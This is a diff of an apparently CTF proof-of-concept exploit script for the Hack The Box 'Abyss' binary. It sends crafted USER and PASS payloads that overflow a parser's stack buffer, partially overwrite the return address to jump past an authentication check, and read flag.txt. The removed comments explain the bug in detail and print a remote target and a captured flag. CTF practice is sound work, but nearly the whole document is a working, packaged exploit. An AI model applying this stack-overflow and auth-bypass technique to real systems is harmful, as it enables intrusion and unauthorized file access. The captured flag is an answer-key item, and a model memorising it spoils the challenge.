@@ -2,78 +2,136 @@
 
 set -euo pipefail
 
-# Challenge: Abyss
-# Platform: Hack The Box - CTF Try Out
-# Category: Pwn / Binary Exploitation
+# -----------------------------------------------------------------------------
+# PoC: Hack The Box - Abyss
+# Type: Parser-driven stack overflow -> partial RIP overwrite -> auth bypass
 #
-# Scenario summary:
-# The binary implements a tiny command protocol:
-#   0 = LOGIN
-#   1 = READ
-#   2 = EXIT
-#
-# It loads random credentials from .creds into global variables and then waits
-# for raw integer commands. At first glance this looks like a normal
-# authentication gate around file reads, but the parser inside cmd_login() is
-# unsafe.
-#
-# Why this is vulnerable:
-# The code reads 512 raw bytes into a stack buffer and then copies bytes from
-# "USER ..." / "PASS ..." into local arrays one byte at a time until it finds
-# a NUL byte.
-#
-# The bug is that read() does not append a terminator.
-# If we send a full 512-byte PASS buffer with no NUL byte, the loop keeps
-# reading past the end of the input buffer and starts re-reading bytes from
-# adjacent stack memory that it is also writing to. That becomes a controlled
-# stack overflow.
-#
-# Real-world lesson:
-# Many developers assume "input from read() behaves like a C string". It does
-# not. Functions like read(), recv(), and fread() return raw byte counts. If
-# you later process that data as if it were NUL-terminated text, you create
-# parser bugs, out-of-bounds reads, and often stack corruption.
-#
-# Exploit strategy used here:
-# We do not need a full long ROP chain.
-# A smaller and cleaner trick works:
-#
-# 1. Start a LOGIN command.
-# 2. Send a crafted USER value.
-# 3. Send a 512-byte PASS value with no NUL byte.
-# 4. The PASS parsing overflow partially overwrites the saved return address.
-# 5. We redirect execution to 0x4014eb, which is inside cmd_read() just after
-#    the "logged_in" check has already been passed.
-# 6. The function then performs the file open/read/write path directly.
-# 7. We provide "flag.txt" as the filename and receive the flag.
-#
-# Important nuance:
-# Because the input loop stops on the first NUL byte, full 8-byte addresses are
-# awkward to place directly in the overflowing data. The intended trick is a
-# partial return-address overwrite. Only the low three bytes are changed:
-#   original return address -> something in main()
-#   overwritten low bytes   -> 0x4014eb
-#
-# The stable payload used in this solve:
-#   USER  = 'a' * (0x5 + 0xc) + '\\x1c' + 'k' * 0xb + '\\xeb\\x14\\x40'
-#   PASS  = 'b' * (0x200 - 5) prefixed by "PASS "
-#   PATH  = "flag.txt"
-#
-# Remote target used during solve:
-#   154.57.164.72:32179
-#
-# Manual reproduction idea:
-# A pwntools script is common for challenges like this, but for portability
-# this PoC uses only the Python standard library so it runs on a plain Linux
-# system without extra packages.
-#
-# Final live flag obtained during testing:
-#   HTB{sH0u1D_h4v3-NU11-t3rmIn4tEd_buf!_310873ad542dac635c2bd22f3f1e8cf7}
+# This script is intended for authorized CTF infrastructure only.
+# -----------------------------------------------------------------------------
 
-HOST="${1:-154.57.164.72}"
-PORT="${2:-32179}"
+readonly SCRIPT_NAME="$(basename "$0")"
+readonly DEFAULT_TIMEOUT=8
+readonly DEFAULT_STAGE_DELAY=0.6
 
-python3 - "$HOST" "$PORT" <<'PY'
+HOST=""
+PORT=""
+TIMEOUT="${DEFAULT_TIMEOUT}"
+STAGE_DELAY="${DEFAULT_STAGE_DELAY}"
+JSON_OUTPUT=0
+VERBOSE=0
+
+usage() {
+  cat <<USAGE
+Usage:
+  ${SCRIPT_NAME} <host> <port>
+  ${SCRIPT_NAME} --host <host> --port <port> [options]
+
+Options:
+  --host <host>          Target host/IP
+  --port <port>          Target TCP port
+  --timeout <seconds>    Socket timeout (default: ${DEFAULT_TIMEOUT})
+  --stage-delay <sec>    Delay between protocol stages (default: ${DEFAULT_STAGE_DELAY})
+  --json                 Print result as JSON
+  --verbose              Enable debug output
+  -h, --help             Show this help message
+
+Exit codes:
+  0  Success (flag extracted)
+  1  Generic failure
+  2  Invalid arguments
+  3  Connectivity/protocol failure
+  4  Exploit sent but flag not found
+USAGE
+}
+
+log_info() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[*] %s\n' "$*" >&2
+  fi
+}
+
+log_debug() {
+  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[D] %s\n' "$*" >&2
+  fi
+}
+
+log_error() {
+  printf '[-] %s\n' "$*" >&2
+}
+
+parse_args() {
+  local positional=()
+
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      --host)
+        HOST="${2:-}"
+        shift 2
+        ;;
+      --port)
+        PORT="${2:-}"
+        shift 2
+        ;;
+      --timeout)
+        TIMEOUT="${2:-}"
+        shift 2
+        ;;
+      --stage-delay)
+        STAGE_DELAY="${2:-}"
+        shift 2
+        ;;
+      --json)
+        JSON_OUTPUT=1
+        shift
+        ;;
+      --verbose)
+        VERBOSE=1
+        shift
+        ;;
+      -h|--help)
+        usage
+        exit 0
+        ;;
+      -* )
+        log_error "Unknown option: $1"
+        usage >&2
+        exit 2
+        ;;
+      *)
+        positional+=("$1")
+        shift
+        ;;
+    esac
+  done
+
+  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
+    HOST="${positional[0]}"
+  fi
+  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
+    PORT="${positional[1]}"
+  fi
+
+  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
+    log_error "Host and port are required."
+    usage >&2
+    exit 2
+  fi
+
+  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
+    log_error "Invalid port: ${PORT}"
+    exit 2
+  fi
+}
+
+main() {
+  parse_args "$@"
+
+  log_info "Target: ${HOST}:${PORT}"
+  log_debug "Using partial RIP overwrite target 0x4014eb inside cmd_read()"
+
+  python3 - "$HOST" "$PORT" "$TIMEOUT" "$STAGE_DELAY" "$JSON_OUTPUT" "$VERBOSE" <<'PY'
+import json
 import re
 import socket
 import struct
@@ -82,57 +140,87 @@ import time
 
 host = sys.argv[1]
 port = int(sys.argv[2])
+timeout = float(sys.argv[3])
+stage_delay = float(sys.argv[4])
+json_output = sys.argv[5] == "1"
+verbose = sys.argv[6] == "1"
 
-# Partial overwrite target: 0x4014eb
-# We only place the low 3 bytes because a full 8-byte address would introduce
-# early NUL bytes and break the vulnerable copy loop.
-ret = b"\xeb\x14\x40"
 
-# This USER payload was derived from the parser's stack behavior.
-# It positions the later overflow so the saved RIP gets the 3-byte partial
-# overwrite we want during PASS processing.
-user_payload = b"a" * (0x5 + 0xC) + b"\x1c" + b"k" * 0xB + ret
+def emit_debug(msg: str) -> None:
+    if verbose and not json_output:
+        print(f"[D] {msg}", file=sys.stderr)
 
-# Full-size PASS payload with no NUL byte.
+
+def fail(code: int, msg: str) -> None:
+    if json_output:
+        print(json.dumps({"ok": False, "error": msg, "target": f"{host}:{port}"}))
+    else:
+        print(f"[-] {msg}", file=sys.stderr)
+    raise SystemExit(code)
+
+
+# cmd_read+0x42 / 0x4014eb, used via low-byte partial return overwrite.
+ret_partial = b"\xeb\x14\x40"
+
+# Layout tuned to cmd_login stack frame behavior.
+user_payload = b"a" * (0x5 + 0xC) + b"\x1c" + b"k" * 0xB + ret_partial
 pass_payload = b"b" * (0x200 - 5)
 
-with socket.create_connection((host, port), timeout=8) as s:
-    # Disable Nagle so our small protocol chunks stay separated more reliably.
-    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+emit_debug(f"USER payload length: {len(user_payload)}")
+emit_debug(f"PASS payload length: {len(pass_payload)}")
 
-    # Step 1: LOGIN command (little-endian integer 0).
-    s.send(struct.pack("<I", 0))
-    time.sleep(0.6)
+try:
+    sock = socket.create_connection((host, port), timeout=timeout)
+except Exception as exc:
+    fail(3, f"Connection failed: {exc}")
 
-    # Step 2: USER stage.
-    s.send(b"USER " + user_payload)
-    time.sleep(0.6)
+try:
+    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    sock.settimeout(timeout)
 
-    # Step 3: PASS stage triggers the parser overflow.
-    s.send(b"PASS " + pass_payload)
-    time.sleep(0.6)
+    # Stage 1: command LOGIN (0)
+    sock.sendall(struct.pack("<I", 0))
+    time.sleep(stage_delay)
 
-    # Step 4: Because execution is redirected into the READ path, the next
-    # bytes we send are treated as the filename argument.
-    s.send(b"flag.txt")
+    # Stage 2: USER line
+    sock.sendall(b"USER " + user_payload)
+    time.sleep(stage_delay)
 
-    s.settimeout(2)
+    # Stage 3: PASS line (full-size, no NULL)
+    sock.sendall(b"PASS " + pass_payload)
+    time.sleep(stage_delay)
+
+    # Stage 4: filename for redirected read path
+    sock.sendall(b"flag.txt")
+
     chunks = []
     while True:
         try:
-            data = s.recv(4096)
+            chunk = sock.recv(4096)
         except socket.timeout:
             break
-        if not data:
+        if not chunk:
             break
-        chunks.append(data)
+        chunks.append(chunk)
+finally:
+    sock.close()
 
-output = b"".join(chunks).decode("latin-1", errors="ignore")
+output = b"".join(chunks).decode("latin1", "ignore")
 match = re.search(r"HTB\{[^}]+\}", output)
 
 if not match:
-    print(output)
-    raise SystemExit("[-] Flag not found in response.")
+    if verbose and not json_output:
+        print("[D] Response preview:", file=sys.stderr)
+        print(output[:600], file=sys.stderr)
+    fail(4, "Flag pattern not found in target response")
 
-print(match.group(0))
+flag = match.group(0)
+
+if json_output:
+    print(json.dumps({"ok": True, "target": f"{host}:{port}", "flag": flag}))
+else:
+    print(flag)
 PY
+}
+
+main "$@"
